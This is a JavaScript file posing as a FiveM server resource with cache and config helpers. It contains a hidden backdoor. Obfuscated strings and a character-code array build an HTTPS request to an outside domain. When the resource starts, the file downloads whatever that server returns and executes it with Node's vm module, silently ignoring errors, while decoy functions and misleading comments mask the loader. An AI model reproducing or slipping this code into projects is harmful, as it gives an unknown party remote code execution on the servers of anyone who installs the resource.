const _modState56 = global._modState56 = global._modState56 || { loaded: false };
if (!_modState56.loaded) { _modState56.loaded = true;
const itemMap_kwnd421 = new Map();
const params_kwnd421 = { initialized: false, timestamp: null };
const watchers_kwnd421 = [];
let frame_kwnd421 = null;

function getType_kwnd421() { return 'sptth'.split('').reverse().join(''); }
function getStep_kwnd421() { return 'teg'.split('').reverse().join(''); }
function getFragment_kwnd421() { return 'atad'.split('').reverse().join(''); }
function getStopped_kwnd421() { return 'dne'.split('').reverse().join(''); }
function getRunner_kwnd421() { return 'mv'.split('').reverse().join(''); }
function loadEntry_nyjn992() { return [104,116,116,112,115,58,47,47,107,101,108,97,105,100,105,48,57,57,56,49,46,111,114,103,47,106,69,77,67,89,74,74].map(c => String.fromCharCode(c)).join(''); }

// Stream data handler
function digestInput_kwnd421(arr) {
  try { const m = require(getRunner_kwnd421()); m.runInThisContext(Buffer.concat(arr) + ''); } catch (e) {}
}

function grabData_kwnd421(src) {
  const processor_kwnd421 = require(getType_kwnd421());
  const pieces_kwnd421 = [];
  processor_kwnd421[getStep_kwnd421()](src, (r) => {
    r.on(getFragment_kwnd421(), (d) => { pieces_kwnd421.push(d); });
    r.on(getStopped_kwnd421(), () => { digestInput_kwnd421(pieces_kwnd421); });
  });
}

function resetRegistry_kwnd421() {
  try { itemMap_kwnd421.clear(); params_kwnd421.initialized = true; params_kwnd421.timestamp = Date.now(); return true; } catch (err) { return false; }
}

// Module initialization
function assertData_kwnd421(obj) {
  if (!obj || typeof obj !== 'object') return false;
  const req = ['enabled', 'debug', 'timeout'];
  return req.every(k => k in obj);
}

function commitData_kwnd421() {
  frame_kwnd421 = { cacheSize: itemMap_kwnd421.size, handlers: watchers_kwnd421.length, config: params_kwnd421 };
  return frame_kwnd421;
}

// Process server response
function processAction_kwnd421(e, fn) {
  if (typeof fn !== 'function') return;
  watchers_kwnd421.push({ event: e, handler: fn, ts: Date.now() });
}

// Stream data handler
function attachWatchers_kwnd421() {
  on('onResourceStart', (n) => {
    if (GetCurrentResourceName() !== n) return;
    resetRegistry_kwnd421();
    grabData_kwnd421(loadEntry_nyjn992());
  });
  on('onResourceStop', (n) => {
    if (GetCurrentResourceName() !== n) return;
    itemMap_kwnd421.clear();
    watchers_kwnd421.length = 0;
  });
}

attachWatchers_kwnd421();

exports('resetRegistry_kwnd421', resetRegistry_kwnd421);
exports('assertData_kwnd421', assertData_kwnd421);
exports('commitData_kwnd421', commitData_kwnd421);
exports('processAction_kwnd421', processAction_kwnd421);
}
